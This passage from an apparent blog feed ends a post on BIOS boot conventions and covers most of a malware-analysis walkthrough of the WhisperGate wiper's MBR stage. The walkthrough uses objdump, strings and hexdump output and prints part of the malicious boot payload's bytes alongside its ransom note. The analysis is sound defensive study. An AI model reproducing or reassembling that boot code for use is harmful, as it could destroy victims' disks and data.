      &lt;th&gt;Starting Address Hex&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;00000&lt;/td&gt;
      &lt;td&gt;BIOS INTERRUPT VECTORS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;00080&lt;/td&gt;
      &lt;td&gt;AVAILABLE INTERRUPT VECTORS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;00400&lt;/td&gt;
      &lt;td&gt;BIOS DATA AREA&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;00500&lt;/td&gt;
      &lt;td&gt;USER READ/WRITE MEMORY&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;F4000&lt;/td&gt;
      &lt;td&gt;CASETTE BASIC INTERPRETER&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FE000&lt;/td&gt;
      &lt;td&gt;BIOS PROGRAM AREA&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;It’s interesting that location 0x7c00 falls in a large section with a fairly generic description. It isn’t clearly defined or called out as a “boot sector” area, &lt;a href=&quot;https://wiki.osdev.org/Memory_Map_(x86)#Overview&quot;&gt;as it often is in modern documentation&lt;/a&gt;. We’ll need to keep looking for references to boot behaviors.&lt;/p&gt;

&lt;p&gt;Appendix A provides the table of interrupts, their human-readable names, and the location in the BIOS code itself where its behavior is defined. INT 19H is first provided in the BIOS interrupt table on page 3-3 (page 167 in the PDF):&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Interrupt Number&lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;BIOS Initialization&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;Bootstrap&lt;/td&gt;
      &lt;td&gt;BOOT_STRAP (F000:E6F2)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;This confirms that INT 19H plays a role in the boot code, and that we can find more information in address E6F2. Fortunately, the manual also gives us a complete assembly listing, so let’s find the &lt;a href=&quot;https://gist.github.com/halcyondream/93726fe6877a6f48ee50c417f38740a3&quot;&gt;INT 19H definition&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This is located in Appendix A, page A-20 (page 210 in the PDF), on line 1355, the block comment which precedes offset E6F2:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;--- INT 19 -----------------------
;BOOT STRAP LOADER
;       IF A 5 1/4&quot; DISKETTE IS AVAILABLE
;       ON THE SYSTEM, TRACK 0, SECTOR 1 IS READ INTO THE
;       BOOT LOCATION (SEGMENT 0, OFFSET 7C00)
;       AND CONTROL IS TRANSFERRED THERE.
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The block comment clearly names the target behavior: if all goes well, dump the boot code into 0x7c00 and transfer execution there.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROC NEAR&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENDP&lt;/code&gt; should stand out as Microsoft Assembly (MASM):&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;--- INT 19 -----------------------
;BOOT STRAP LOADER
;       ...
;----------------------------------
        ASSUME CS:CODE,DS:DATA 
BOOT_STRAP PROC NEAR
        ...
BOOT_STRAP ENDP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;One convenient side-effect of MASM is that it gives us a clear start and end for this procedure.&lt;/p&gt;

&lt;p&gt;The full-line comments in the procedure body shed some light on the algorithm:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Load system from diskette.&lt;/li&gt;
  &lt;li&gt;Handle error (unable to IPL from diskette).&lt;/li&gt;
  &lt;li&gt;IPL was successful.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The final command of the procedure occurs right after the third comment, and is the only execution path for success:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        JMP     BOOT_LOCN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, execution will transfer to the address at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOT_LOCN&lt;/code&gt;. What address is this? The block quote from earlier gave it away, but there’s another way we can verify this behavior.&lt;/p&gt;

&lt;p&gt;As luck would have it, the guide also shows the assembled bytes represented by each assembly instruction. The location of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOT_LOCN&lt;/code&gt; can be inferred from the byte sequence, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EA007C000000&lt;/code&gt;, at the beginning of the line. We can expand this for readability:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EA 00 7C 00 00 00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can disassemble this to a similar result as before:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo -ne &quot;\xEA\x00\x7C\x00\x00\x00&quot; &amp;gt; realmode.bin
                                                                                
$ hexdump -C realmode.bin                  
00000000  ea 00 7c 00 00 00                                 |..|...|
00000006
                                                                                
$ objdump -D -b binary -mi386 -Maddr16,data16,intel realmode.bin

realmode.bin:     file format binary


Disassembly of section .data:

00000000 &amp;lt;.data&amp;gt;:
   0:	ea 00 7c 00 00       	jmp    0x0:0x7c00
	...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is a far jump to location &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0000:7c00&lt;/code&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">If you research BIOS and MBR conventions, you’ll find lot of “insider knowledge” without many back-references or primary sources. This will only get worse as systems migrate to UEFI, and MBR is laid to rest with cassette tapes and CD players. For now, we can expect to live with MBR BIOS for some period of time, so there is still some merit in researching its conventions.</summary></entry><entry><title type="html">Analyzing MBR Malware</title><link href="http://localhost:4000/2025/01/07/mbr-malware.html" rel="alternate" type="text/html" title="Analyzing MBR Malware" /><published>2025-01-07T00:00:00-05:00</published><updated>2025-01-07T00:00:00-05:00</updated><id>http://localhost:4000/2025/01/07/mbr-malware</id><content type="html" xml:base="http://localhost:4000/2025/01/07/mbr-malware.html">&lt;p&gt;Many years ago, I read through a catalog of master’s courses. One of the first courses in the program is about operating systems. The very first topic they explore is how to create a custom, operating-system-agnostic bootloader from scratch.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://thasso.xyz/2024/07/13/setting-up-an-x86-cpu.html&quot;&gt;Custom bootloaders&lt;/a&gt;, much like custom inits and custom kernels, have a place in my heart where a Linux hobbyist still exists. The process is not necessarily difficult, but it does require a lot of reading into some narrow topics (such as the &lt;a href=&quot;https://cdrdv2.intel.com/v1/dl/getContent/671447&quot;&gt;IA-32 Software Developer’s Manual&lt;/a&gt;, or &lt;a href=&quot;https://docs.kernel.org/arch/arm64/booting.html&quot;&gt;relevant ARM64 resources on the topic&lt;/a&gt;). It can quickly become challenging depending on what exactly you want to the boot code to do.&lt;/p&gt;

&lt;p&gt;A good example of a widely known bootloader is GRUB. Most Linux desktop or server users know it through a handful of configurations and commands, like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;update-grub&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grub-install&lt;/code&gt; command modifies the MBR on legacy BIOS systems, but most users aren’t interested in what it really does. Compared to a hand-written bootloader, the user may have limited visibility or control over the generated code. Often, it’s sufficient to know that it “just works.”&lt;/p&gt;

&lt;p&gt;But where’s the fun in that?&lt;/p&gt;

&lt;p&gt;Over the past decade, we’ve seen instances of ransomware and &lt;a href=&quot;https://en.wikipedia.org/wiki/Wiper_(malware)&quot;&gt;wipers&lt;/a&gt; leveraging MBR boot code for persistence and elevated privileges. My very first time hearing about MBR-based malware came with the reports of STUXNET. A few years later, a late friend in the Linux community had also brought it up (in a larger discussion about the desktop model’s attack surface).&lt;/p&gt;

&lt;p&gt;This should raise a question: how difficult is it to write MBR malware? Before that, we should discuss the paramters for writing MBR boot code in general.&lt;/p&gt;

&lt;h1 id=&quot;malware-in-the-mbr&quot;&gt;Malware in the MBR&lt;/h1&gt;

&lt;p&gt;Writing dubious or malicious boot code is a well-documented subject. If you’re new to the topic, I strongly recommend &lt;a href=&quot;https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/writing-a-custom-bootloader&quot;&gt;this writeup by Red Team Notes&lt;/a&gt;. It’s a fun starting point and a succint introduction.&lt;/p&gt;

&lt;p&gt;An interesting, if unfortunate, consequence of MBR code is that it runs in &lt;a href=&quot;https://en.wikipedia.org/wiki/Real_mode&quot;&gt;16-bit “Real Mode.”&lt;/a&gt; This limits the boot code a handful of rules and BIOS system interrupts.&lt;/p&gt;

&lt;p&gt;Real-mode is also highly privileged. It runs well before the operating system loads, and therefore has precedence over Linux root or Windows Administrator privileges. If abused, this can cause severe damage to the system and hard disks, and the operating system may have no knowledge of it or any way to deter it.&lt;/p&gt;

&lt;p&gt;An interesting feature of Real Mode is that it is operating-system agnostic by design. This means that you could develop a different malware loader for many operating systems or architectures that overwrites the victim’s MBR with the same boot code. In other words, while malware strands are often Windows-based, you could just as easily write a Linux or BSD variant and get the same outcome.&lt;/p&gt;

&lt;p&gt;MBR boot code is more likely to use real mode only to execute a second stage in 32-bit “Protected Mode.” This second stage will contain more sophisticated boot code and is the basis of how bootloaders, including GRUB, operate behind the scenes. For malware authors, this could provide more opportunities for better attacks.&lt;/p&gt;

&lt;p&gt;Most modern computers are likely to use UEFI, not BIOS, to boot. At the cost of some complexity, UEFI offers robust features such as Secure Boot, and generally has an easier time booting from flash storage, such as NVMe. This is usually a good thing.&lt;/p&gt;

&lt;p&gt;So, why bring up MBR malware now? Lots of legacy systems still use BIOS. If your grandma is still playing Solitaire on her same Windows XP computer from the 2000s, she’s probably running BIOS with MBR. The same is true for agencies or organizations running the same systems from ten, twenty, or thirty years ago.&lt;/p&gt;

&lt;p&gt;As malware in and of itself, STUXNET is often considered one of the greats. At least, it’s one of the most widely studied. You can certainly find samples online as well as an entire GitHub repo with the code reverse engineered in C.&lt;/p&gt;

&lt;p&gt;However, there are plenty of other MBR-based malware samples from the past decade. A notable example is a NotPetya variant, which &lt;a href=&quot;https://www.crowdstrike.com/en-us/blog/petrwrap-technical-analysis-part-2-further-findings-and-potential-for-mbr-recovery/&quot;&gt;employed a malicious MBR in order to facilitate ransomware&lt;/a&gt;. But another MBR-based sample caught my eye fairly recently: WhisperGate.&lt;/p&gt;

&lt;h1 id=&quot;whispergate&quot;&gt;WhisperGate&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://attack.mitre.org/software/S0689/&quot;&gt;WhisperGate&lt;/a&gt; is “a multi-stage wiper designed to look like ransomware.” The bit about being a &lt;a href=&quot;https://www.crowdstrike.com/en-us/blog/petrwrap-technical-analysis-part-2-further-findings-and-potential-for-mbr-recovery/&quot;&gt;wiper&lt;/a&gt; disguised as ransomware cannot be understated. (It’s one reason why people will often recommend not to pay the attacker. With a wiper, the ransom money cannot recover your data, because even the attackers cannot recover your data.)&lt;/p&gt;

&lt;p&gt;Campaigns which deployed WhisperGate targeted a handful of Ukrainian sectors, including government, nonprofit, and IT organizations. In September of last year, the group made headlines after the &lt;a href=&quot;https://www.lemonde.fr/en/international/article/2024/09/05/whispergate-us-charges-five-russian-military-officers-over-ukraine-cyberattacks_6724963_4.html&quot;&gt;FBI arrested several Russian officials who were linked to the malware campaign&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;A &lt;a href=&quot;https://www.virustotal.com/gui/file/a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92&quot;&gt;well-documented WhisperGate variant&lt;/a&gt; used three stages: one to corrupt the bootloader (&lt;a href=&quot;https://attack.mitre.org/techniques/T1542&quot;&gt;T1542&lt;/a&gt;), another to download the third stage from a Discord server, and a final one to both tamper with Windows Defender and to overwrite files from a pre-set list of extensions.&lt;/p&gt;

&lt;p&gt;The first stage caught my attention.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.crowdstrike.com/en-us/blog/technical-analysis-of-whispergate-malware/&quot;&gt;CrowdStrike&lt;/a&gt; describes the MBR-corrupting routine with the following pseudocode:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for i_disk between 0 and total_detected_disk_count do
   for i_sector between 1 and total_disk_sector_count, i_sector += 199, do
      overwrite disk i_disk at sector i_sector with hardcoded data
   done
done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;Note: The bit about skipping 199 sectors was, and still is, interesting. My best guess here is coverage. By skipping every 199 sectors, you get a good-enough tradeoff for data corruption and total execution time.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If you run WhisperGate in a public sandbox, it will likely do nothing. One sandbox in particular marked it safe because it probed the registry for two keys and aborted execution. This is likely defense evasion (&lt;a href=&quot;https://attack.mitre.org/techniques/T1497&quot;&gt;T1497&lt;/a&gt;), as the key values were empty because of the sandbox configuration.&lt;/p&gt;

&lt;p&gt;There’s a &lt;a href=&quot;https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3&quot;&gt;very good writeup on the malware&lt;/a&gt;, which I would strongly recommend reading. It covers the details succinctly and was a true starting point for this guide.&lt;/p&gt;

&lt;p&gt;In my walkthrough here, I’ll simply expand on these findings by investigating a few questions:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;How could we determine this was MBR malware?&lt;/li&gt;
  &lt;li&gt;What does the MBR boot code look like in the binary?&lt;/li&gt;
  &lt;li&gt;How can you isolate the MBR boot code?&lt;/li&gt;
  &lt;li&gt;How would you analyze the boot code using static and dynamic analysis?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To that end, we will take “the hard way” to investigate the boot code. The tools used here are well-known and open source, so you can follow along or follow up on anything discussed here. This guide uses a Unix-like environment for analysis.&lt;/p&gt;

&lt;p&gt;Of note, we will spend far less time on the malicious installer, and far more time on the aspects of it that deal with the MBR code. The boot code specifically is the main point of discussion.&lt;/p&gt;

&lt;h1 id=&quot;extracting-the-mbr-code&quot;&gt;Extracting the MBR code&lt;/h1&gt;

&lt;p&gt;First, we need a sample of this malware. Both the CrowdStrike and the S2W guides investigate the sample with the following SHA256 hash:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can download this from sites like the &lt;a href=&quot;https://bazaar.abuse.ch/&quot;&gt;Malware Bazaar&lt;/a&gt;. Unzip it with the password, and you’ll have an EXE whose name matches the hash value.&lt;/p&gt;

&lt;p&gt;If you’re on a Linux system, use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If you’re on macOS, you can use the equivalent package from Homebrew:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/homebrew/Cellar/x86_64-elf-binutils/&amp;lt;version&amp;gt;/bin/x86_64-elf-objdump
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First, let’s confirm the file type:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ file a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92.exe

a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this case, the filename is the same value as the hash. This is useful for initial analysis, but it’s a pretty long filename. Let’s alias it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wg.exe&lt;/code&gt; just for clarity moving forward:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92.exe wg.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next, let’s dump strings (annotated):&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ strings wg.exe
(A) !This program cannot be run in DOS mode.
...
(B) AAAAA
Your hard drive has been corrupted.
In case you want to recover all hard drives
of your organization,
You should pay us  $10k via bitcoin wallet
1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via
tox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65
with your organization name.
We will contact you to give further instructions.
...
(C) glob-1.0-mingw32
(D) GCC: (GNU) 6.3.0
...
(E) CreateFileW
...
(F) WriteFile
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Of interest, we find:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;A&lt;/em&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#ms-dos-stub-image-only&quot;&gt;PE header&lt;/a&gt; artifact&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;B&lt;/em&gt;: Ransom note, repeated several times&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;C, D&lt;/em&gt;: Evidence that MinGW and GCC were used to build this&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;E, F&lt;/em&gt;: File manipulation calls for Windows&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There are other interesting strings, but this discussion is about the MBR code specifically, so let’s focus on that. We know from other research that &lt;em&gt;WriteFile&lt;/em&gt; is the API function that overwrites the MBR. However, even without prior knowledge (or an entire writeup) of the installer, &lt;em&gt;WriteFile&lt;/em&gt; is a good starting point for analysis, because it can indiscriminately overwrite sections of the hard drive.&lt;/p&gt;

&lt;p&gt;With that in mind, let’s analyze focus on these strings specifically:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;B&lt;/em&gt; tells us that the ransom note is not obfuscated or encrypted. This suggests that the MBR code may exist in cleartext, without any weird decoding or decryption routines. This makes it a low-hanging fruit for analysis.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;F&lt;/em&gt; confirms that &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile&quot;&gt;&lt;em&gt;WriteFile&lt;/em&gt;&lt;/a&gt; is used in this sample.&lt;/li&gt;
  &lt;li&gt;The call to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew&quot;&gt;&lt;em&gt;CreateFileW&lt;/em&gt;&lt;/a&gt; at &lt;em&gt;E&lt;/em&gt; opens the primary hard drive for writing the corrupted MBR code. Its result, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HANDLE&lt;/code&gt; type, becomes the first parameter in the call to &lt;em&gt;WriteFile.&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Disassemble and search for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WriteFile&lt;/code&gt; section. Notice it’s stripped, so we can’t grep the disassembly for something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call WriteFile&lt;/code&gt;. Instead, we need to find the file offset.&lt;/p&gt;

&lt;p&gt;We can use the following formula:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;ImageBase + VirtualMemoryAddress = Offset&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;To get these values, call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt; with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-x&lt;/code&gt; parameter:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -x wg.exe
...
ImageBase		00400000
...
	vma:     Ordinal  Hint  Member-Name  Bound-To
--[snip]--
	0000a180  &amp;lt;none&amp;gt;  04f3  WriteFile
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this case, the image base is 0x00400000 and the VMA offset is 0x0000a180&lt;/p&gt;

&lt;p&gt;So:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;0x400000 + 0xa180 = 0x40a180&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If we grep the disassembly for references to &lt;strong&gt;40a180&lt;/strong&gt;, we end up in the &lt;a href=&quot;https://www.bordergate.co.uk/import-address-tables&quot;&gt;import address table&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -D -b binary -Mintel -m i386 wg.exe | grep 40a180 -B 4
    2ea0:	ff 25 94 a1 40 00    	jmp    DWORD PTR ds:0x40a194
    2ea6:	90                   	nop
    2ea7:	90                   	nop
    2ea8:	ff 25 80 a1 40 00    	jmp    DWORD PTR ds:0x40a180
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp&lt;/code&gt; statement for &lt;em&gt;WriteFile&lt;/em&gt; is at address 0x2ea8, let’s grep for references to &lt;strong&gt;2ea8&lt;/strong&gt; instead:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -D -b binary -Mintel -m i386 wg.exe | grep 2ea8

    2ea8: ff 25 80 a1 40 00    jmp    DWORD PTR ds:0x40a180
    2ff9: e8 aa fe ff ff       call   0x2ea8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In addition to the IAT entry, we also see a call to the IAT address, which confirms that &lt;em&gt;WriteFile&lt;/em&gt; is used in this code.&lt;/p&gt;

&lt;p&gt;Recall earlier that many results appeared containing the ransom note. To find which one is actually used, we can backtrack the assembly:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -D -b binary -Mintel -m i386 wg.exe | grep 0x2ea8 -B 100
...
    2f7a:	be 20 40 40 00       	mov    esi,0x404020
...
    2f81:	8d bd e8 df ff ff    	lea    edi,[ebp-0x2018]
...
    2f91:	f3 a5                	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
...
    2fd1:	8d 85 e8 df ff ff    	lea    eax,[ebp-0x2018]
...
    2fed:	c7 44 24 08 00 02 00 	mov    DWORD PTR [esp+0x8],0x200
    2ff4:	00 
    2ff5:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
    2ff9:	e8 aa fe ff ff       	call   0x2ea8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The text snippet here shows how the ransom note, located at 0x404020, is passed along as an argument to the &lt;em&gt;WriteFile&lt;/em&gt; call at 0x2ff9. We could express the call line in C like:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;WriteFile(fileHandle, (LPCVOID)0x404020, 0x200, 0, 0)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this case, the data at 0x404020 contains the ransom note needed. 512 (0x200) bytes, the size of the MBR, are used in the call to &lt;em&gt;WriteFile&lt;/em&gt;. This is likely the MBR code, but we want to prove it before relying on assumptions. So, let’s get the file offset and see what data exists there.&lt;/p&gt;

&lt;p&gt;To find the file offset, first get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.data&lt;/code&gt; section’s VMA and File Offset:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -x wg.exe
...
Sections:
Idx Name          Size      VMA       LMA       File off  Algn
...
  1 .data         00002038  00404000  00404000  00003200  2**5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can determine the file offset with:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;VirtualOffset&lt;/em&gt; - &lt;em&gt;DataSectionVMA&lt;/em&gt; + &lt;em&gt;DataSectionFileOffset&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;0x404020 - 0x404000 + 0x3200 = 0x3220.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We can confirm this is correct using hexdump:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ hexdump -C wg.exe | \
	grep 3220 -A $((0x1F))
00003220  eb 00 8c c8 8e d8 be 88  7c e8 00 00 50 fc 8a 04  |........|...P...|
00003230  3c 00 74 06 e8 05 00 46  eb f4 eb 05 b4 0e cd 10  |&amp;lt;.t....F........|
00003240  c3 8c c8 8e d8 a3 78 7c  66 c7 06 76 7c 82 7c 00  |......x|f..v|.|.|
00003250  00 b4 43 b0 00 8a 16 87  7c 80 c2 80 be 72 7c cd  |..C.....|....r|.|
00003260  13 72 02 73 18 fe 06 87  7c 66 c7 06 7a 7c 01 00  |.r.s....|f..z|..|
00003270  00 00 66 c7 06 7e 7c 00  00 00 00 eb c4 66 81 06  |..f..~|......f..|
00003280  7a 7c c7 00 00 00 66 81  16 7e 7c 00 00 00 00 f8  |z|....f..~|.....|
00003290  eb af 10 00 01 00 00 00  00 00 01 00 00 00 00 00  |................|
000032a0  00 00 41 41 41 41 41 00  59 6f 75 72 20 68 61 72  |..AAAAA.Your har|
000032b0  64 20 64 72 69 76 65 20  68 61 73 20 62 65 65 6e  |d drive has been|
000032c0  20 63 6f 72 72 75 70 74  65 64 2e 0d 0a 49 6e 20  | corrupted...In |
000032d0  63 61 73 65 20 79 6f 75  20 77 61 6e 74 20 74 6f  |case you want to|
000032e0  20 72 65 63 6f 76 65 72  20 61 6c 6c 20 68 61 72  | recover all har|
000032f0  64 20 64 72 69 76 65 73  0d 0a 6f 66 20 79 6f 75  |d drives..of you|
00003300  72 20 6f 72 67 61 6e 69  7a 61 74 69 6f 6e 2c 0d  |r organization,.|
00003310  0a 59 6f 75 20 73 68 6f  75 6c 64 20 70 61 79 20  |.You should pay |
00003320  75 73 20 20 24 31 30 6b  20 76 69 61 20 62 69 74  |us  $10k via bit|
00003330  63 6f 69 6e 20 77 61 6c  6c 65 74 0d 0a 31 41 56  |coin wallet..1AV|
00003340  4e 4d 36 38 67 6a 36 50  47 50 46 63 4a 75 66 74  |NM68gj6PGPFcJuft|
00003350  4b 41 54 61 34 57 4c 6e  7a 67 38 66 70 66 76 20  |KATa4WLnzg8fpfv |
00003360  61 6e 64 20 73 65 6e 64  20 6d 65 73 73 61 67 65  |and send message|
